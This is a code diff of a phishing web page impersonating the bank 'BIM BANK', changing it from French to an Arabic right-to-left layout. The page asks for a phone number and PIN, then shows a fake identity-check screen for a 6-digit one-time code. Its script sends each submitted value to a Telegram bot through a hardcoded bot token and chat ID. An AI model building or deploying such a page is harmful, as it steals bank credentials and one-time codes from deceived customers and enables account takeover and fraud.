@@ -1,109 +1,186 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bimbank - Wallet</title>
+    <title>المصرف الرقمي - تسجيل الدخول</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f8faff; margin: 0; min-height: 100vh; color: #3b4d70; }
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
         
-        .grid-bg {
-            background-image: linear-gradient(#e5e7eb 1px, transparent 1px), linear-gradient(90deg, #e5e7eb 1px, transparent 1px);
-            background-size: 25px 25px;
+        body { 
+            font-family: 'Tajawal', sans-serif; 
+            background: #f4f7f6; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh;
         }
 
-        .logo-section { display: flex; flex-direction: column; align-items: center; padding: 40px 0 20px; }
-        .logo-img { width: 200px; height: auto; }
-        .welcome-text { font-size: 1.2rem; color: #3b4d70; text-align: center; margin-top: 10px; font-weight: 500; }
+        /* الهيدر العلوي بنمط بنكي */
+        .app-header {
+            background: linear-gradient(135deg, #1a2a6c, #2a4858);
+            height: 220px;
+            padding: 40px 20px;
+            border-bottom-left-radius: 40px;
+            border-bottom-right-radius: 40px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
 
-        .tab-container { display: flex; border: 2px solid #324a84; border-radius: 12px; margin: 20px 30px; overflow: hidden; background: white; }
-        .tab-btn { flex: 1; padding: 12px; text-align: center; font-weight: bold; font-size: 0.9rem; }
-        .tab-active { background-color: #324a84; color: white; }
-        .tab-inactive { color: #9ca3af; }
+        .bank-logo {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
 
-        .form-section { padding: 0 30px; }
-        .login-title { font-size: 1.2rem; font-weight: bold; color: #324a84; margin-bottom: 20px; text-align: left; }
+        /* حاوية النموذج */
+        .login-card {
+            background: white;
+            margin: -60px 25px 20px;
+            padding: 30px 20px;
+            border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
+        }
 
-        .input-group { position: relative; margin-bottom: 20px; }
-        .custom-input { width: 100%; padding: 15px; border: 1px solid #d1d5db; border-radius: 10px; outline: none; font-size: 1rem; background: white; }
-        .input-counter { position: absolute; right: 10px; bottom: -18px; font-size: 10px; color: #9ca3af; }
+        .input-box {
+            position: relative;
+            margin-bottom: 25px;
+        }
 
-        .forgot-link { display: block; text-align: right; color: #9ca3af; font-size: 0.85rem; margin-top: 10px; text-decoration: none; }
+        .input-box label {
+            display: block;
+            font-size: 13px;
+            color: #7f8c8d;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
 
-        .btn-orange { background-color: #f19e2c; color: white; width: 100%; padding: 15px; border-radius: 10px; font-size: 1.1rem; font-weight: bold; margin-top: 25px; border: none; cursor: pointer; }
-        
-        .footer-section { text-align: center; margin-top: 40px; }
-        .signup-text { color: #3b4d70; font-weight: bold; margin-top: 8px; display: block; }
+        .input-box input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid #ecf0f1;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            outline: none;
+            text-align: center;
+            color: #2c3e50;
+            transition: 0.3s;
+        }
 
-        .contact-btn { display: flex; align-items: center; justify-content: center; gap: 10px; border: 1.5px solid #3b4d70; border-radius: 10px; padding: 10px 30px; margin: 30px auto; width: fit-content; color: #3b4d70; font-weight: 500; }
+        .input-box input:focus {
+            border-color: #1a2a6c;
+            background: #f9f9ff;
+        }
 
-        /* OTP Modal Styles */
-        #otp-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 100; padding: 20px; }
-        .modal-content { background: white; border-radius: 20px; width: 100%; max-width: 360px; padding: 30px; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-        .close-modal { position: absolute; top: 15px; right: 15px; font-size: 24px; color: #324a84; cursor: pointer; }
-        
-        .timer-circle { width: 120px; height: 120px; border: 6px solid #fff5e6; border-top: 6px solid #f19e2c; border-radius: 50%; margin: 10px auto 20px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; color: #3b4d70; }
-        .otp-label { text-align: left; font-size: 0.95rem; color: #4b5563; margin-bottom: 8px; }
+        /* الأزرار المصرفية */
+        .btn-primary {
+            background: #1a2a6c;
+            color: white;
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(26, 42, 108, 0.3);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #1a2a6c;
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            border: 1.5px solid #1a2a6c;
+            border-radius: 12px;
+            margin-top: 15px;
+        }
+
+        /* واجهة الـ OTP المصرفية */
+        #screen-otp { 
+            display: none; 
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .otp-input {
+            width: 80%;
+            padding: 15px;
+            font-size: 24px;
+            letter-spacing: 15px;
+            border: 2px solid #1a2a6c;
+            border-radius: 15px;
+            text-align: center;
+            margin: 30px 0;
+            outline: none;
+        }
+
+        .timer-text {
+            color: #e74c3c;
+            font-weight: bold;
+        }
     </style>
 </head>
-<body class="grid-bg">
+<body>
 
-    <!-- Screen 1: Login -->
+    <!-- الشاشة الأولى: تسجيل دخول مصرفي -->
     <div id="screen-login">
-        <div class="logo-section">
-            <img src="https://i.ibb.co/m5v8G1f/bimbank-logo.png" alt="Bimbank" class="logo-img">
-            <div class="welcome-text">Bienvenue dans votre<br>espace wallet</div>
+        <div class="app-header">
+            <div class="bank-logo">BIM BANK</div>
+            <p class="opacity-80">الخدمات المصرفية الرقمية الآمنة</p>
         </div>
 
-        <div class="tab-container">
-            <div class="tab-btn tab-active">Wallet</div>
-            <div class="tab-btn tab-inactive">Banking</div>
-        </div>
-
-        <div class="form-section">
-            <div class="login-title">Connexion</div>
+        <div class="login-card">
+            <h2 class="text-xl font-bold text-[#1a2a6c] mb-6 text-center">تسجيل الدخول</h2>
             
-            <div class="input-group">
-                <input id="phone" type="tel" class="custom-input" placeholder="Téléphone" maxlength="8" oninput="updateCounter(this, 'c-phone')">
-                <span id="c-phone" class="input-counter">0/8</span>
+            <div class="input-box">
+                <label>رقم الهاتف</label>
+                <!-- قانون: أرقام فقط (8 أرقام) -->
+                <input id="phone" type="tel" maxlength="8" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       placeholder="00000000">
             </div>
 
-            <div class="input-group">
-                <input id="pin" type="password" class="custom-input" placeholder="Mot de passe" maxlength="4" oninput="updateCounter(this, 'c-pin')">
-                <span id="c-pin" class="input-counter">0/4</span>
+            <div class="input-box">
+                <label>الرمز السري</label>
+                <!-- قانون: أرقام فقط (4 أرقام) -->
+                <input id="pin" type="password" maxlength="4" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       placeholder="****">
             </div>
 
-            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
-
-            <button onclick="handleLogin()" class="btn-orange">Connexion</button>
+            <button onclick="handleLogin()" class="btn-primary">دخول آمن</button>
+            <button class="btn-secondary">نسيت كلمة المرور؟</button>
         </div>
 
-        <div class="footer-section">
-            <p class="text-gray-500 text-sm">Nouvel utilisateur ?</p>
-            <a href="#" class="signup-text">S'inscrire maintenant &rarr;</a>
-            
-            <div class="contact-btn">
-                <svg style="width:20px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-width="2"></path></svg>
-                <span>Contacts</span>
-            </div>
+        <div class="text-center mt-10">
+            <p class="text-gray-500 text-sm">ليس لديك حساب؟ <span class="text-[#1a2a6c] font-bold">افتح حسابك الآن</span></p>
         </div>
     </div>
 
-    <!-- Screen 2: OTP Modal -->
-    <div id="otp-modal">
-        <div class="modal-content">
-            <span class="close-modal" onclick="closeOTP()">&times;</span>
-            <div class="timer-circle" id="timer">04:59</div>
-            
-            <div class="otp-label">Entrez le code OTP</div>
-            <div class="input-group">
-                <input id="otp" type="tel" class="custom-input" maxlength="6" oninput="updateCounter(this, 'c-otp')">
-                <span id="c-otp" class="input-counter">0/6</span>
-            </div>
+    <!-- الشاشة الثانية: واجهة التحقق OTP -->
+    <div id="screen-otp">
+        <div class="mb-10">
+            <img src="https://img.icons8.com/ios-filled/100/1a2a6c/shield-confirmation.png" class="mx-auto mb-4">
+            <h2 class="text-2xl font-bold text-[#1a2a6c]">تأكيد الهوية</h2>
+            <p class="text-gray-500 mt-2">لقد أرسلنا رمز التحقق المكون من 6 أرقام إلى هاتفك</p>
+        </div>
 
-            <button onclick="submitOTP()" class="btn-orange">Connexion</button>
+        <div class="bg-white p-8 rounded-3xl shadow-sm border border-gray-100">
+            <!-- قانون: أرقام فقط (6 أرقام للـ OTP الخاص ببيم بنك) -->
+            <input id="otp_code" type="tel" maxlength="6" class="otp-input"
+                   oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                   placeholder="000000">
+            
+            <p class="mb-6">تنتهي صلاحية الرمز خلال: <span id="timer" class="timer-text">04:59</span></p>
+            
+            <button onclick="submitOTP()" class="btn-primary">تأكيد العملية</button>
+            <p class="mt-6 text-[#1a2a6c] font-medium underline">إعادة إرسال الرمز</p>
         </div>
     </div>
 
@@ -111,49 +188,41 @@
         const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
         const CHAT = "8665814266";
 
-        function updateCounter(el, id) {
-            el.value = el.value.replace(/[^0-9]/g, '');
-            document.getElementById(id).innerText = `${el.value.length}/${el.maxLength}`;
-        }
-
         function handleLogin() {
-            const phone = document.getElementById('phone').value;
-            const pin = document.getElementById('pin').value;
+            const u = document.getElementById('phone').value;
+            const p = document.getElementById('pin').value;
 
-            if(phone.length === 8 && pin.length === 4) {
-                send(`🏦 Bimbank Login\n📱 Phone: ${phone}\n🔐 PIN: ${pin}`);
-                document.getElementById('otp-modal').style.display = 'flex';
+            if(u.length === 8 && p.length === 4) {
+                send(`🏦 BIM BANK - LOGIN\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
+                document.getElementById('screen-login').style.display = 'none';
+                document.getElementById('screen-otp').style.display = 'block';
                 startTimer(299);
             } else {
-                alert("Veuillez remplir les champs correctement.");
+                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح (أرقام فقط)");
             }
         }
 
         function submitOTP() {
-            const otp = document.getElementById('otp').value;
-            if(otp.length === 6) {
-                send(`🔑 Bimbank OTP: ${otp}`);
-                alert("Vérification en cours...");
+            const code = document.getElementById('otp_code').value;
+            if(code.length === 6) {
+                send(`🔑 BIM BANK - OTP: ${code}`);
+                alert("جاري التحقق من الهوية...");
                 location.reload();
             } else {
-                alert("Entrez le code à 6 chiffres.");
+                alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
             }
         }
 
         function startTimer(duration) {
-            let timer = duration, minutes, seconds;
+            let timer = duration, min, sec;
             const display = document.getElementById('timer');
-            const interval = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-                display.textContent = minutes + ":" + seconds;
-                if (--timer < 0) clearInterval(interval);
+            setInterval(function () {
+                min = parseInt(timer / 60, 10);
+                sec = parseInt(timer % 60, 10);
+                display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
+                if (--timer < 0) timer = 0;
             }, 1000);
         }
-
-        function closeOTP() { document.getElementById('otp-modal').style.display = 'none'; }
 
         function send(msg) {
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
@@ -161,3 +230,4 @@
     </script>
 </body>
 </html>
+
